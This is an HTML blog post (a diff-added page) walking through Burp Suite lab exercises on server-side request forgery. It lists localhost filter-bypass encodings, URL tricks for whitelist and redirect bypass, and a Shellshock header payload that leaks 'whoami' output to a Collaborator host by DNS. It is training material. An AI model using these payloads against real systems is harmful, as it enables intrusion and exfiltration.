@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>burpsuite靶场ssrf - ThnPinkman’s blog</title><meta name="Description" content="只是向上走"><meta property="og:url" content="https://thnpkm.github.io/posts/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/burpsuite%E9%9D%B6%E5%9C%BAssrf/">
+  <meta property="og:site_name" content="ThnPinkman’s blog">
+  <meta property="og:title" content="burpsuite靶场ssrf">
+  <meta property="og:description" content="服务器端请求伪造 (SSRF) 针对本地服务器的基本 SSRF 在商品下查看货物库存情况时抓包
+有stockApi参数 ，来进行访问
+根据目的修改成http://localhost/admin 是顺利访问到该页面的 ，也可以访问delete?username=carlos来删除这个用户
+为什么服务器会默认信任来自本地地址的请求呢，大概有如下原因
+访问控制策略可能编写于前端，我们修改请求包的时候是已经通过了前端的，所以很容易就被绕过了 有的应用程序为了方便灾难恢复将服务器设置为任意用户都可访问，这就导致也会默认信任本地地址 针对另一个后端系统的基本 SSRF 有的后端系统用户是无法直接访问的，但是服务器可以成功向其发送请求，所以如果利用ssrf同样可以向这些本不对用户开放的后端系统发出恶意请求。
+同样的方式，不过需要对ip进行爆破
+同样操作即可
+SSRF 与基于黑名单的输入过滤器 最常见的黑名单哦，127.0.0.1和localhost等关键词有不少方法来绕
+127.0.0.1绕过-进制转换十进制 2130706433八进制 017700000001二进制 0b1111111000000000000000000000001 十六进制 0x7f000001http://localhost/ # localhost就是代指127.0.0.1http://0/ # 0在window下代表0.0.0.0，而在liunx下代表127.0.0.1http://[0:0:0:0:0:ffff:127.0.0.1]/ # 在liunx下可用，window测试了下不行http://[::]:80/ # 在liunx下可用，window测试了下不行http://127。0。0。1/ # 用中文句号绕过http://①②⑦.⓪.⓪.①http://127.1/http://127.00000.00000.001/ # 0的数量多一点少一点都没影响，最后还是会指向127.0.0.1 admin用双重url编码即可
+基于白名单的输入过滤器的 SSRF 在@前加的内容都不会被解析成host的内容，而#或?后面的的内容也不会被解析到path中
+url=http://ctf.@127.0.0.1/flag.php?show 双 URL 编码#是%2523
+http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos SSRF 通过开放重定向漏洞绕过过滤器 以上的尝试是不行的
+另一个功能点，查看下一个商品 ，会重定向到下一个商品
+可以利用这里的path参数进行重定向到指定的页面
+带外检测的盲 SSRF 与sql盲注相同，ssrf盲打最佳利用方式就是通过带外技术接收响应结果。也是同样使用burp自带的简易带外平台collaborator。即使有一些HTTP流量会被拦截，也会因为不怎么拦截DNS流量而获取我们想要的结果。 有的情况还可以利用SSRF盲打对目标后端系统进行探测，比如探测目标网络中开放的主机及端口之类的，这些同样也可以通过带外通道接收到。
+题目中直接告诉我们Referer头存在SSRF盲打漏洞">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-20T22:52:36+08:00">
+    <meta property="article:modified_time" content="2024-08-20T22:52:36+08:00">
+    <meta property="article:tag" content="Ssrf">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="burpsuite靶场ssrf">
+  <meta name="twitter:description" content="服务器端请求伪造 (SSRF) 针对本地服务器的基本 SSRF 在商品下查看货物库存情况时抓包
+有stockApi参数 ，来进行访问
+根据目的修改成http://localhost/admin 是顺利访问到该页面的 ，也可以访问delete?username=carlos来删除这个用户
+为什么服务器会默认信任来自本地地址的请求呢，大概有如下原因
+访问控制策略可能编写于前端，我们修改请求包的时候是已经通过了前端的，所以很容易就被绕过了 有的应用程序为了方便灾难恢复将服务器设置为任意用户都可访问，这就导致也会默认信任本地地址 针对另一个后端系统的基本 SSRF 有的后端系统用户是无法直接访问的，但是服务器可以成功向其发送请求，所以如果利用ssrf同样可以向这些本不对用户开放的后端系统发出恶意请求。
+同样的方式，不过需要对ip进行爆破
+同样操作即可
+SSRF 与基于黑名单的输入过滤器 最常见的黑名单哦，127.0.0.1和localhost等关键词有不少方法来绕
+127.0.0.1绕过-进制转换十进制 2130706433八进制 017700000001二进制 0b1111111000000000000000000000001 十六进制 0x7f000001http://localhost/ # localhost就是代指127.0.0.1http://0/ # 0在window下代表0.0.0.0，而在liunx下代表127.0.0.1http://[0:0:0:0:0:ffff:127.0.0.1]/ # 在liunx下可用，window测试了下不行http://[::]:80/ # 在liunx下可用，window测试了下不行http://127。0。0。1/ # 用中文句号绕过http://①②⑦.⓪.⓪.①http://127.1/http://127.00000.00000.001/ # 0的数量多一点少一点都没影响，最后还是会指向127.0.0.1 admin用双重url编码即可
+基于白名单的输入过滤器的 SSRF 在@前加的内容都不会被解析成host的内容，而#或?后面的的内容也不会被解析到path中
+url=http://ctf.@127.0.0.1/flag.php?show 双 URL 编码#是%2523
+http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos SSRF 通过开放重定向漏洞绕过过滤器 以上的尝试是不行的
+另一个功能点，查看下一个商品 ，会重定向到下一个商品
+可以利用这里的path参数进行重定向到指定的页面
+带外检测的盲 SSRF 与sql盲注相同，ssrf盲打最佳利用方式就是通过带外技术接收响应结果。也是同样使用burp自带的简易带外平台collaborator。即使有一些HTTP流量会被拦截，也会因为不怎么拦截DNS流量而获取我们想要的结果。 有的情况还可以利用SSRF盲打对目标后端系统进行探测，比如探测目标网络中开放的主机及端口之类的，这些同样也可以通过带外通道接收到。
+题目中直接告诉我们Referer头存在SSRF盲打漏洞">
+<meta name="application-name" content="ThnPinkman&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="ThnPinkman&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://thnpkm.github.io/posts/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/burpsuite%E9%9D%B6%E5%9C%BAssrf/" /><link rel="prev" href="https://thnpkm.github.io/posts/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/burpsuite%E9%9D%B6%E5%9C%BAxxe/" /><link rel="next" href="https://thnpkm.github.io/posts/ctf/python%E6%80%BB%E7%BB%93/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "burpsuite靶场ssrf",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/thnpkm.github.io\/posts\/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80\/burpsuite%E9%9D%B6%E5%9C%BAssrf\/"
+        },"genre": "posts","keywords": "ssrf","wordcount":  100 ,
+        "url": "https:\/\/thnpkm.github.io\/posts\/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80\/burpsuite%E9%9D%B6%E5%9C%BAssrf\/","datePublished": "2024-08-20T22:52:36+08:00","dateModified": "2024-08-20T22:52:36+08:00","publisher": {
+            "@type": "Organization",
+            "name": "","logo": "https:\/\/thnpkm.github.io\/1651835469576.jpg"},"author": {
+                "@type": "Person",
+                "name": "Author"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="ThnPinkman’s blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.github.io/1651835469576.jpg"
+        data-srcset="https://thnpkm.github.io/1651835469576.jpg, https://thnpkm.github.io/1651835469576.jpg 1.5x, https://thnpkm.github.io/1651835469576.jpg 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.github.io/1651835469576.jpg"
+        title="https://thnpkm.github.io/1651835469576.jpg" />ThnPinkman&#39;s blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="ThnPinkman’s blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.github.io/1651835469576.jpg"
+        data-srcset="https://thnpkm.github.io/1651835469576.jpg, https://thnpkm.github.io/1651835469576.jpg 1.5x, https://thnpkm.github.io/1651835469576.jpg 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.github.io/1651835469576.jpg"
+        title="https://thnpkm.github.io/1651835469576.jpg" />ThnPinkman&#39;s blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">burpsuite靶场ssrf</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-category">included in <a href="/categories/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Web漏洞基础</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-08-20">2024-08-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;100 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;One minute&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#针对本地服务器的基本-ssrf">针对本地服务器的基本 SSRF</a></li>
+    <li><a href="#针对另一个后端系统的基本-ssrf">针对另一个后端系统的基本 SSRF</a></li>
+    <li><a href="#ssrf-与基于黑名单的输入过滤器">SSRF 与基于黑名单的输入过滤器</a></li>
+    <li><a href="#基于白名单的输入过滤器的-ssrf">基于白名单的输入过滤器的 SSRF</a></li>
+    <li><a href="#ssrf-通过开放重定向漏洞绕过过滤器">SSRF 通过开放重定向漏洞绕过过滤器</a></li>
+    <li><a href="#带外检测的盲-ssrf">带外检测的盲 SSRF</a></li>
+    <li><a href="#利用-shellshock-的盲-ssrf">利用 Shellshock 的盲 SSRF</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="服务器端请求伪造-ssrf">服务器端请求伪造 (SSRF)</h1>
+<h2 id="针对本地服务器的基本-ssrf">针对本地服务器的基本 SSRF</h2>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212222315736.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212222315736.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212222315736.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212222315736.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212222315736.png"
+        title="image-20221222231512567" /></p>
+<p>在商品下查看货物库存情况时抓包</p>
+<!-- raw HTML omitted -->
+<p>有<code>stockApi</code>参数 ，来进行访问</p>
+<p>根据目的修改成<code>http://localhost/admin</code> 是顺利访问到该页面的 ，也可以访问delete?username=carlos来删除这个用户</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231135043.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231135043.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231135043.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231135043.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231135043.png"
+        title="image-20221223113552987" /></p>
+<p>为什么服务器会默认信任来自本地地址的请求呢，大概有如下原因</p>
+<ul>
+<li>访问控制策略可能编写于前端，我们修改请求包的时候是已经通过了前端的，所以很容易就被绕过了</li>
+<li>有的应用程序为了方便灾难恢复将服务器设置为任意用户都可访问，这就导致也会默认信任本地地址</li>
+</ul>
+<h2 id="针对另一个后端系统的基本-ssrf">针对另一个后端系统的基本 SSRF</h2>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231140154.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231140154.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231140154.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231140154.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231140154.png"
+        title="image-20221223114035115" /></p>
+<p>有的后端系统用户是无法直接访问的，但是服务器可以成功向其发送请求，所以如果利用ssrf同样可以向这些本不对用户开放的后端系统发出恶意请求。</p>
+<p>同样的方式，不过需要对ip进行爆破</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231145259.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231145259.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231145259.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231145259.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231145259.png"
+        title="image-20221223114536223" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231147092.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231147092.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231147092.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231147092.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231147092.png"
+        title="image-20221223114703069" /></p>
+<p>同样操作即可</p>
+<h2 id="ssrf-与基于黑名单的输入过滤器">SSRF 与基于黑名单的输入过滤器</h2>
+<p>最常见的黑名单哦，127.0.0.1和localhost等关键词有不少方法来绕</p>
+<pre tabindex="0"><code>127.0.0.1绕过-进制转换
+ 
+十进制 2130706433
+ 
+八进制 017700000001
+ 
+二进制 0b1111111000000000000000000000001 
+十六进制 0x7f000001
+
+http://localhost/       # localhost就是代指127.0.0.1
+http://0/               # 0在window下代表0.0.0.0，而在liunx下代表127.0.0.1
+http://[0:0:0:0:0:ffff:127.0.0.1]/    # 在liunx下可用，window测试了下不行
+http://[::]:80/           # 在liunx下可用，window测试了下不行
+http://127。0。0。1/       # 用中文句号绕过
+http://①②⑦.⓪.⓪.①
+http://127.1/
+http://127.00000.00000.001/ # 0的数量多一点少一点都没影响，最后还是会指向127.0.0.1
+</code></pre><p>admin用双重url编码即可</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231221296.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231221296.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231221296.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231221296.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231221296.png"
+        title="image-20221223122131260" /></p>
+<h2 id="基于白名单的输入过滤器的-ssrf">基于白名单的输入过滤器的 SSRF</h2>
+<p>在@前加的内容都不会被解析成host的内容，而#或?后面的的内容也不会被解析到path中</p>
+<pre tabindex="0"><code>url=http://ctf.@127.0.0.1/flag.php?show
+</code></pre><!-- raw HTML omitted -->
+<p>双 URL 编码<code>#</code>是<code>%2523</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username<span style="color:#f92672">=</span>carlos
+</span></span></code></pre></div><h2 id="ssrf-通过开放重定向漏洞绕过过滤器">SSRF 通过开放重定向漏洞绕过过滤器</h2>
+<!-- raw HTML omitted -->
+<p>以上的尝试是不行的</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231247049.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231247049.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231247049.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231247049.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231247049.png"
+        title="image-20221223124714681" /></p>
+<p>另一个功能点，查看下一个商品 ，会重定向到下一个商品</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231248312.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231248312.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231248312.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231248312.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231248312.png"
+        title="image-20221223124814272" /></p>
+<p>可以利用这里的path参数进行重定向到指定的页面</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231254410.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231254410.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231254410.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231254410.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231254410.png"
+        title="image-20221223125407374" /></p>
+<h2 id="带外检测的盲-ssrf">带外检测的盲 SSRF</h2>
+<blockquote>
+<p>与sql盲注相同，ssrf盲打最佳利用方式就是通过带外技术接收响应结果。也是同样使用burp自带的简易带外平台collaborator。即使有一些HTTP流量会被拦截，也会因为不怎么拦截DNS流量而获取我们想要的结果。
+有的情况还可以利用SSRF盲打对目标后端系统进行探测，比如探测目标网络中开放的主机及端口之类的，这些同样也可以通过带外通道接收到。</p>
+</blockquote>
+<!-- raw HTML omitted -->
+<p>题目中直接告诉我们Referer头存在SSRF盲打漏洞</p>
+<!-- raw HTML omitted -->
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231646718.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231646718.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231646718.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231646718.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231646718.png"
+        title="image-20221223164641670" /></p>
+<p>临时collaborator地址贴上去</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231647812.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231647812.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231647812.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231647812.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231647812.png"
+        title="image-20221223164710773" /></p>
+<p>客户端接收到了发过来的DNS请求</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231649143.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231649143.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231649143.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231649143.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231649143.png"
+        title="image-20221223164923076" /></p>
+<p>证明这里存在可以盲打的ssrf</p>
+<h2 id="利用-shellshock-的盲-ssrf">利用 Shellshock 的盲 SSRF</h2>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231659763.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231659763.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231659763.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231659763.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231659763.png"
+        title="image-20221223165905729" /></p>
+<p>安装一下Collaborator Everywhere插件</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231734087.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231734087.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231734087.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231734087.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231734087.png"
+        title="image-20221223173432046" /></p>
+<p>从名字就能看出来这个插件可以对每一个点都进行collaborator测试以发现可以使用带外技术发送请求的点，为了方便插件进行测试，我们将靶场地址添加到目标中</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231740096.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231740096.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231740096.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231740096.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231740096.png"
+        title="image-20221223174059058" /></p>
+<p>然后开启网页代理，随意访问</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231743943.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231743943.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231743943.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231743943.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231743943.png"
+        title="image-20221223174336870" /></p>
+<p>自动fuzz出一些存在的问题点referer和user-agent</p>
+<p>题目给出了请用shellshock的payload进行ssrf盲打192.168.0.*:8080， 寻找Shellshock（CVE-2014-6271） 的payload</p>
+<pre tabindex="0"><code>() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN
+</code></pre><p>先用Burp Collaborator client创建个域名 替换BURP-COLLABORATOR-SUBDOMAIN</p>
+<p><code>p8y574iqy5ac2it9il925s2vvm1cp1.oastify.com</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231827146.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231827146.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231827146.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231827146.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231827146.png"
+        title="image-20221223182733077" /></p>
+<p>Collaborator client有回显出来 <code>     **peter-QB8oXF** </code>就是用户，说明whoami不仅执行成功了，还把执行结果附加在URL中向指定的collaborator客户端发送请求了</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231829586.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231829586.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231829586.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231829586.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212231829586.png"
+        title="image-20221223182929507" /></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2024-08-20</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
